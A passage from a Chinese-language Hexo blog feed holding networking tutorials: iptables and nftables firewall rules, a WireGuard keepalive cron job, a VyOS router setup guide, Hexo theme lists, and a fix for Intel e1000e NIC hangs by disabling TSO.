id="iptables-2">iptables</h3><p>編輯<code>/etc/iptables/rules.v4</code>中的filter區段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs conf">*filter<br>:INPUT ACCEPT [0:0]<br>:FORWARD DROP [0:0]<br>:OUTPUT ACCEPT [0:0]<br># 基於狀態放行或丟棄封包<br>-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT<br>-A INPUT -m state --state INVALID -j DROP<br># 允許icmp封包(ping)<br>-A INPUT -p icmp -j ACCEPT<br># 允許loopback的所有封包<br>-A INPUT -i lo -j ACCEPT<br># 一分鐘內如果超過10的新連接，則DROP掉這個IP的封包<br>-A INPUT -i wan -m state --state NEW -m recent --set --name filter --mask 255.255.255.255 --rsource<br>-A INPUT -i wan -m state --state NEW -m recent --rcheck --seconds 60 --hitcount 10 --name filter --mask 255.255.255.255 --rsource -j DROP<br># 允許SSH連線<br>-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT<br># 設定入站規則若都沒匹配，則用icmp-host-prohibited拒絕封包<br>-A INPUT -j REJECT --reject-with icmp-host-prohibited<br># 基於狀態放行或丟棄封包<br>-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT<br>-A FORWARD -m state --state INVALID -j DROP<br># 允許子網對外發起連線<br>-A FORWARD -m state --state NEW --source 10.0.0.0/24 -j ACCEPT<br>COMMIT<br></code></pre></td></tr></table></figure><p>應用設定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">iptables-restore /etc/iptables/rules.v4</span><br></code></pre></td></tr></table></figure><h3 id="nftables-2">nftables</h3><p>編輯<code>/etc/nftables.conf</code>，增加以下設定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs conf">table inet filter &#123;<br>        set internalv4 &#123;<br>                type ipv4_addr<br>                flags interval<br>                auto-merge<br>                elements = &#123; 10.0.0.0/24 &#125;<br>        &#125;<br>        set global_ratelimitv4 &#123;<br>                type ipv4_addr<br>                timeout 60s<br>                flags dynamic<br>        &#125;<br>        set global_ratelimitv6 &#123;<br>                type ipv6_addr<br>                timeout 60s<br>                flags dynamic<br>        &#125;<br>        set input_service_port &#123;<br>                type inet_service<br>                elements = &#123; 22 &#125;<br>        &#125;<br>        chain INPUT &#123;<br>                type filter hook input priority filter; policy accept;<br>                ct state related,established accept<br>                ct state invalid drop<br>                ip saddr @global_ratelimitv4 reject with icmp type admin-prohibited<br>                ip6 saddr @global_ratelimitv6 reject with icmpv6 type admin-prohibited<br>                meta l4proto icmp accept<br>                iif &quot;lo&quot; accept<br>                iifname &quot;wan&quot; tcp dport @input_service_port ct state new limit rate over 10/minute update @global_ratelimitv4 &#123; ip saddr &#125;<br>                iifname &quot;wan&quot; tcp dport @input_service_port ct state new limit rate over 10/minute update @global_ratelimitv6 &#123; ip6 saddr &#125;<br>                tcp dport @input_service_port accept<br>                reject with icmpx type admin-prohibited<br>        &#125;<br>        chain FORWARD &#123;<br>                type filter hook forward priority filter; policy drop;<br>                ct state related,established accept<br>                ct state invalid drop<br>                ip saddr @internalv4 ct state new accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>整體設定的邏輯和前面iptables的部分相同，不過為了配合ipv4+ipv6雙棧做了一些修改，nftables的可讀性還不錯，應該可以直接理解設定的內容</p><h1 id="進階設定">進階設定</h1><p><a href="/create-wireguard-site-to-site-tunnel">使用Wireguard建立Site to Site Tunnel</a></p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://wiki.nftables.org/wiki-nftables/index.php/Nftables_families">Nftables families - nftables wiki</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://wiki.nftables.org/wiki-nftables/index.php/Configuring_chains">Configuring chains - nftables wiki</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://wiki.nftables.org/wiki-nftables/index.php/Simple_rule_management">Simple rule management - nftables wiki</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://wiki.nftables.org/wiki-nftables/index.php/Main_Page">nftables wiki</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>server</tag>
      
      <tag>router</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wireguard的keepalive設定</title>
    <link href="/wireguard-persistent-keepalive/"/>
    <url>/wireguard-persistent-keepalive/</url>
    
    <content type="html"><![CDATA[<h1 id="問題">問題</h1><p>在使用wireguard時會發現一個問題，當連線長時間靜默時，wireguard會自動切斷連線，這時就無法連線到對方。wireguard有提供一個對應的設定值<code>PersistentKeepalive</code>，會隔設定的秒數向對方發送心跳包，但如果只在單端設定，wireguard會因為對方長時間沒有回應，認為對方斷線，從而切斷連線。</p><p>但是有時候server端自己無法控制，剛好server端又沒有加上<code>PersistentKeepalive</code>的設定，此時就要用一些其他的方法來維持連線了。</p><h1 id="解法">解法</h1><p>解法其實很簡單，定時向對面發送封包即可，可以將以下指令新增到crontab，記得新增到可以免密碼使用<code>wg-quick</code>的user上，或者新增到root的，我是使用* * * * *(每分鐘發送一次ping，如果斷線則重啟對應的wireguard連線)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c1 -W5 &lt;peer<span class="hljs-string">&#x27;s wireguard IP&gt; 1&gt;/dev/null 2&gt;/dev/null || (sudo wg-quick down &lt;config name&gt; ; sudo wg-quick up &lt;config name&gt;)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>疑難雜症</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>wireguard</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VyOS快速設定</title>
    <link href="/vyos-quick-setup/"/>
    <url>/vyos-quick-setup/</url>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>之前在配置家中的網路時，曾經嘗試使用VyOS作為路由器的系統，這篇文章簡單記錄一下安裝及配置的過程。</p><h1 id="下載">下載</h1><p>VyOS雖然是開源的系統，但是並未對一般用戶提供LTS版本的ISO下載，只能下載Rolling Release版本的（也就是nightly build），不過我試用的感覺覺得沒什麼差別，應該不至於有穩定性上的問題，相較來說只是測試沒有LTS全面的版本，如果對於Rolling Release版本保有疑慮，也可以考慮自行編譯LTS版本，可以參考這篇<a href="https://docs.vyos.io/en/latest/contributing/build-vyos.html">文章</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Build VyOS — VyOS 1.5.x (circinus) documentation](https://docs.vyos.io/en/latest/contributing/build-vyos.html)">[1]</span></a></sup></p><h1 id="安裝">安裝</h1><p>在使用ISO開機後，使用預設帳號登入(vyos/vyos)</p><p><img src="vyos_login.png" alt=""></p><p>輸入<code>install image</code>後按照提示安裝系統</p><p><img src="vyos_install.png" alt=""></p><p>VyOS可以同時安裝多個版本，未來若想更新，可以直接使用新的ISO安裝，或是從已安裝好的系統內添加新系統的entry</p><h1 id="配置">配置</h1><p>VyOS的配置有點類似cisco的邏輯，使用set和delete兩個指令來新增或刪除設定，可以使用edit和top來進入下層設定或回到頂層，在configure mode下也可使用run來運行一般模式的指令。</p><p>VyOS的shell是bash，不過載入了特製的設定檔，可以直接輸入linux中有的指令來使用，如果想使用bash的補全，可以直接執行<code>bash</code>進入常規的bash環境。</p><p>首先輸入<code>configure</code>進入配置模式</p><h2 id="系統設定">系統設定</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 設定hostname</span><br><span class="hljs-built_in">set</span> system host-name &lt;hostname&gt;<br><span class="hljs-comment"># 設定系統時區</span><br><span class="hljs-built_in">set</span> system time-zone Asia/Taipei<br><span class="hljs-comment"># 建立新的使用者</span><br><span class="hljs-built_in">set</span> system login user &lt;user&gt; authentication plaintext-password &lt;password&gt;<br><span class="hljs-comment"># 刪除預設vyos的帳號</span><br>delete system login user vyos<br><span class="hljs-comment"># 設定新帳戶的ssh金鑰</span><br><span class="hljs-built_in">set</span> system login user &lt;user&gt; authentication public-keys &lt;user@host&gt; <span class="hljs-built_in">type</span> &lt;ssh-rsa/ssh-ed25519&gt;<br><span class="hljs-built_in">set</span> system login user &lt;user&gt; authentication public-keys &lt;user@host&gt; key &lt;text&gt;<br></code></pre></td></tr></table></figure><h2 id="IP-Address">IP Address</h2><h3 id="wan">wan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 設定外部網路連線</span><br><span class="hljs-built_in">set</span> interface ethernet &lt;wan port&gt; address &lt;dhcp/static ip&gt;<br><span class="hljs-built_in">set</span> interface ethernet &lt;wan port&gt; description WAN<br><span class="hljs-comment"># 如果外網連線是static IP，則需設定IP</span><br><span class="hljs-built_in">set</span> interface ethernet &lt;wan port&gt; address &lt;x.x.x.x/x&gt;<br><span class="hljs-built_in">set</span> protocols static route 0.0.0.0/0 next-hop &lt;gateway ip&gt;<br></code></pre></td></tr></table></figure><p>如果是使用pppoe撥號可以參考這篇<a href="https://docs.vyos.io/en/latest/configuration/interfaces/pppoe.html">文章</a><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[PPPoE — VyOS 1.5.x (circinus) documentation](https://docs.vyos.io/en/latest/configuration/interfaces/pppoe.html)">[2]</span></a></sup></p><h3 id="lan">lan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 設定內網IP</span><br><span class="hljs-built_in">set</span> interface ethernet &lt;lan port&gt; address &lt;10.x.x.x/24&gt;<br><span class="hljs-built_in">set</span> interface ethernet &lt;lan port&gt; description LAN<br></code></pre></td></tr></table></figure><h2 id="服務">服務</h2><h3 id="ssh">ssh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 設定ssh使用的port</span><br><span class="hljs-built_in">set</span> service ssh port 22<br><span class="hljs-comment"># 設定只允許金鑰登入</span><br><span class="hljs-built_in">set</span> service ssh disable-password-authentication<br></code></pre></td></tr></table></figure><h3 id="dhcp">dhcp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 進入dhcp設定層級</span><br>edit service dhcp-server shared-network-name &lt;text&gt; subnet &lt;10.x.x.x/24&gt;<br><span class="hljs-comment"># 設定gateway</span><br><span class="hljs-built_in">set</span> option default-router &lt;10.x.x.254&gt; <span class="hljs-comment"># 前面設定lan口的IP</span><br><span class="hljs-comment"># 設定dns</span><br><span class="hljs-built_in">set</span> option name-server 1.1.1.1<br><span class="hljs-comment"># 設定內網domain，可跳過</span><br><span class="hljs-built_in">set</span> option domain-name xxx.local<br><span class="hljs-comment"># dhcp租約時間(秒)</span><br><span class="hljs-built_in">set</span> lease 86400<br><span class="hljs-comment"># 設定dhcp ip pool</span><br><span class="hljs-built_in">set</span> range 0 start 10.x.x.2<br><span class="hljs-built_in">set</span> range 0 stop 10.x.x.199<br><span class="hljs-comment"># subnet id ，不重複即可</span><br><span class="hljs-built_in">set</span> subnet-id 1<br><span class="hljs-comment"># 如果想要設定static dhcp可以參考底下兩行的範例</span><br><span class="hljs-built_in">set</span> static-mapping &lt;text&gt; ip-address &lt;ip&gt;<br><span class="hljs-built_in">set</span> static-mapping &lt;text&gt; mac &lt;mac&gt;<br>top<br></code></pre></td></tr></table></figure><h2 id="nat">nat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 進入nat設定層級</span><br>edit nat <span class="hljs-built_in">source</span> rule 100<br><span class="hljs-comment"># 設定出口設備</span><br><span class="hljs-built_in">set</span> outbound-interface name eth1<br><span class="hljs-comment"># 設定來源IP(內部IP)</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">source</span> address 10.x.x.0/24<br><span class="hljs-comment"># 設定nat</span><br><span class="hljs-built_in">set</span> translation address masquerade<br>top<br></code></pre></td></tr></table></figure><h2 id="firewall">firewall</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 進入防火牆設定層級</span><br>edit firewall<br><span class="hljs-comment"># 以組別來管理防火牆規則</span><br><span class="hljs-built_in">set</span> group interface-group WAN interface eth1<br><span class="hljs-built_in">set</span> group interface-group LAN interface eth0<br><span class="hljs-built_in">set</span> group network-group LAN-v4 network 10.x.x.x/24<br><span class="hljs-comment"># 設定全域規則</span><br><span class="hljs-built_in">set</span> global-options state-policy established action accept<br><span class="hljs-built_in">set</span> global-options state-policy related action accept<br><span class="hljs-built_in">set</span> global-options state-policy invalid action drop<br><span class="hljs-comment"># 設定從外部往內部轉發時的規則</span><br><span class="hljs-comment"># 設定一條新的鏈，預設行為丟棄封包</span><br><span class="hljs-built_in">set</span> ipv4 name OUTSIDE-IN default-action drop<br><span class="hljs-comment"># 當符合從外部網路向內部IP路由時，跳到OUTSIDE-IN的鏈上</span><br><span class="hljs-built_in">set</span> ipv4 forward filter rule 100 action jump<br><span class="hljs-built_in">set</span> ipv4 forward filter rule 100 jump-target OUTSIDE-IN<br><span class="hljs-built_in">set</span> ipv4 forward filter rule 100 inbound-interface group WAN<br><span class="hljs-built_in">set</span> ipv4 forward filter rule 100 destination group network-group LAN-v4<br><span class="hljs-comment"># 設定路由器本身的INPUT filter</span><br><span class="hljs-comment"># 當使用tcp訪問端口22時跳到VyOS_MANAGEMENT鏈上</span><br><span class="hljs-built_in">set</span> ipv4 input filter default-action drop<br><span class="hljs-built_in">set</span> ipv4 input filter rule 20 action jump<br><span class="hljs-built_in">set</span> ipv4 input filter rule 20 jump-target VyOS_MANAGEMENT<br><span class="hljs-built_in">set</span> ipv4 input filter rule 20 destination port 22<br><span class="hljs-built_in">set</span> ipv4 input filter rule 20 protocol tcp<br><span class="hljs-comment"># 設定一條新的鏈</span><br><span class="hljs-comment"># 從內部網路來的連線全部允許</span><br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 10 action accept<br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 10 inbound-interface group LAN<br><span class="hljs-comment"># 從wan來的連線，當1分鐘連線3次以上則丟棄封包</span><br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 20 action drop<br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 20 recent count 3<br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 20 recent time minute<br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 20 state new<br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 20 inbound-interface group WAN<br><span class="hljs-comment"># 允許從wan來的連線</span><br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 21 action accept<br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 21 state new<br><span class="hljs-built_in">set</span> ipv4 name VyOS_MANAGEMENT rule 21 inbound-interface group WAN<br><span class="hljs-comment"># 允許回應ping</span><br><span class="hljs-built_in">set</span> ipv4 input filter rule 30 action accept<br><span class="hljs-built_in">set</span> ipv4 input filter rule 30 icmp type-name echo-request<br><span class="hljs-built_in">set</span> ipv4 input filter rule 30 protocol icmp<br><span class="hljs-built_in">set</span> ipv4 input filter rule 30 state new<br><span class="hljs-comment"># 允許本機的所有連線</span><br><span class="hljs-built_in">set</span> ipv4 input filter rule 50 action accept<br><span class="hljs-built_in">set</span> ipv4 input filter rule 50 <span class="hljs-built_in">source</span> address 127.0.0.0/8<br>top<br></code></pre></td></tr></table></figure><h2 id="應用及儲存">應用及儲存</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 應用</span><br>commit<br><span class="hljs-comment"># 儲存(寫入到開機設定)</span><br>save<br><span class="hljs-comment"># 也可簡化為底下</span><br><span class="hljs-comment"># commit; save</span><br></code></pre></td></tr></table></figure><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://docs.vyos.io/en/latest/contributing/build-vyos.html">Build VyOS — VyOS 1.5.x (circinus) documentation</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://docs.vyos.io/en/latest/configuration/interfaces/pppoe.html">PPPoE — VyOS 1.5.x (circinus) documentation</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://docs.vyos.io/en/latest/quick-start.html">Quick Start — VyOS 1.5.x (circinus) documentation</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>router</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo的個人化設定</title>
    <link href="/hexo-customization/"/>
    <url>/hexo-customization/</url>
    
    <content type="html"><![CDATA[<h1 id="Theme">Theme</h1><ul><li><p><a href="https://github.com/EvanNotFound/hexo-theme-redefine">redefine</a></p></li><li><p><a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid</a></p></li><li><p><a href="https://github.com/jerryc127/hexo-theme-butterfly">butterfly</a></p></li><li><p><a href="https://github.com/XPoet/hexo-theme-keep">keep</a></p></li><li><p><a href="https://github.com/ppoffice/hexo-theme-icarus">icarus</a></p></li><li><p><a href="https://github.com/volantis-x/hexo-theme-volantis">volantis</a></p></li><li><p><a href="https://github.com/Molunerfinn/hexo-theme-melody">melody</a></p></li><li><p><a href="https://github.com/fi3ework/hexo-theme-archer">archer</a></p></li><li><p><a href="https://github.com/auroral-ui/hexo-theme-aurora">aurora</a></p></li><li><p><a href="https://github.com/iissnan/hexo-theme-next">next</a></p></li><li><p><a href="https://github.com/blinkfox/hexo-theme-matery">matery</a></p></li><li><p><a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe">nextmoe</a></p></li><li><p><a href="https://github.com/LouisBarranqueiro/hexo-theme-tranquilpeak">tranquilpeak</a></p></li><li><p><a href="https://github.com/litten/hexo-theme-yilia">yilia</a></p></li><li><p><a href="https://github.com/tufu9441/maupassant-hexo">maupassant</a></p></li><li><p><a href="https://github.com/iblh/hexo-theme-material">material</a></p></li><li><p><a href="https://github.com/search?q=hexo-theme&amp;type=repositories">others</a></p></li></ul><h1 id="Plugin">Plugin</h1><ul><li><a href="https://github.com/hexojs/hexo-renderer-markdown-it">hexo-renderer-markdown-it</a><ul><li>將渲染器從marked更換為markdown-it</li></ul></li><li><a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a><ul><li>生成搜尋使用的index</li></ul></li><li><a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a><ul><li>生成rss feed</li></ul></li><li><a href="https://github.com/hexojs/hexo-math">hexo-math</a><ul><li>對數學公式提供更好的渲染</li></ul></li><li><a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a><ul><li>方便部屬到github/gitlab的插件</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>好文共賞</title>
    <link href="/some-good-post/"/>
    <url>/some-good-post/</url>
    
    <content type="html"><![CDATA[<h1 id="【譯】替-swap-辯護：常見的誤解"><a href="https://farseerfc.me/in-defence-of-swap.html">【譯】替 swap 辯護：常見的誤解</a></h1><p>對於swap的功能解釋清楚，用簡單的語言解釋了內核是如何操作記憶體和swap</p><h1 id="【譯】使用-GNU-stow-管理你的點文件"><a href="https://farseerfc.me/using-gnu-stow-to-manage-your-dotfiles.html">【譯】使用 GNU stow 管理你的點文件</a></h1><p>當你有很多機器要管理時，就會發現這篇文章的幫助多大了</p><h1 id="Nginx-server-和-location-優先順序"><a href="https://bigpxuan.blogspot.com/2018/07/nginx-server-location.html">Nginx server 和 location 優先順序</a></h1><p>一篇文章講清楚nginx 內部導向的規則，當然，如果你只是把他當成反向代理，也許這篇文章幫助沒那麼大</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>I218-V、I219-V系列網卡在Linux下突然關閉的解法</title>
    <link href="/e1000e-detected-hardware-unit-hang/"/>
    <url>/e1000e-detected-hardware-unit-hang/</url>
    
    <content type="html"><![CDATA[<h1 id="前情提要">前情提要</h1><p>在今天下午上傳一個檔案的過程中，突然發現傳輸過程斷斷續續的，接著就徹底連不上了，進到pve的後台查看，網卡和IP都還在，但就是無法連線上另一端。</p><h1 id="症狀">症狀</h1><p>使用<code>dmesg</code>查看kernel log後發現出現了一堆err等級的log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs log">[xxxxxx] e1000e 0000:00:1f.6 eno1: Detected Hardware Unit Hang:<br>                  TDH                  &lt;44&gt;<br>                  TDT                  &lt;9b&gt;<br>                  next_to_use          &lt;9b&gt;<br>                  next_to_clean        &lt;43&gt;<br>                buffer_info[next_to_clean]:<br>                  time_stamp           &lt;101d5f5e3&gt;<br>                  next_to_watch        &lt;44&gt;<br>                  jiffies              &lt;101d5f700&gt;<br>                  next_to_watch.status &lt;0&gt;<br>                MAC Status             &lt;40080083&gt;<br>                PHY Status             &lt;796d&gt;<br>                PHY 1000BASE-T Status  &lt;3800&gt;<br>                PHY Extended Status    &lt;3000&gt;<br>                PCI Status             &lt;10&gt;<br>[xxxxxx] e1000e 0000:00:1f.6 eno1: Reset adapter unexpectedly<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs log">[xxxxxx] NETDEV WATCHDOG: CPU: 8: transmit queue 0 timed out xxx ms<br></code></pre></td></tr></table></figure><p>類似這樣的log在傳輸的過程中會不斷出現，一開始也許重開後還可以連線，但到後來就會直接徹底斷線，無法傳輸。</p><h1 id="發生原因">發生原因</h1><p>把這些log貼到google上做簡單的查詢後就會發現這是一個存在Intel I218-V、I219-V系列網卡上很久的bug了，在使用e1000e driver時，如果有大流量通過就有可能觸發。</p><p>這個錯誤我查到最早的記錄在2011年就有了<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[ubuntu 10.10 - Linux e1000e (Intel networking driver) problem with resume and pcie=off - Server Fault](https://serverfault.com/questions/249080/linux-e1000e-intel-networking-driver-problem-with-resume-and-pcie-off)">[1]</span></a></sup>，我猜測可能是我更新後導致這個問題出現( 目前版本: PVE Version8、Kernel Version 6.8.8 )？不然實在沒有道理之前正常使用，突然就出問題。</p><p>根據這幾篇文章<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[118721 – e1000e hardware unit hangs when TSO is on](https://bugzilla.kernel.org/show_bug.cgi?id=118721f)">[2]</span></a></sup><sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[e1000e eno1: Detected Hardware Unit Hang: | Proxmox Support Forum](https://forum.proxmox.com/threads/e1000e-eno1-detected-hardware-unit-hang.59928/)">[3]</span></a></sup><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[e1000 driver hang | Proxmox Support Forum](https://forum.proxmox.com/threads/e1000-driver-hang.58284/)">[4]</span></a></sup>的解釋，問題都指向了網卡開啟的feature。</p><p>最有可能造成問題的可能是tso( tcp-segmentation-offload )，其次可能是gso( generic-segmentation-offload )</p><p>可以使用<code>ethtool -k &lt;network interface&gt; | grep ' on'</code>來檢視網卡開啟了哪些功能。</p><p>使用<code>ethtool -K &lt;network interface&gt; tso off</code>來將網卡的tso功能關閉，如果網卡關閉後仍然有問題，可以嘗試繼續關閉gso或其他功能，透過測試來判斷到底使哪個功能引起錯誤，只需要關閉對應的功能即可。</p><h1 id="解法">解法</h1><p>找到引起錯誤的功能後就需要將設定自動在開機時應用，這一步有很多方法可以用，像是寫一個systemd service，或是其他在開機時執行的方法皆可，不過我習慣將網路設置的部分集中在一起放到<code>/etc/network/interface</code></p><p>舉例來說eno1是有問題的網卡，在他底下加上這行<code>up ethtool -K eno1 tso off</code>即可在網卡開啟時自動關閉對應的feature</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs config">#---<br>auto eno1<br>iface eno1 inet manual<br>#---<br>        up 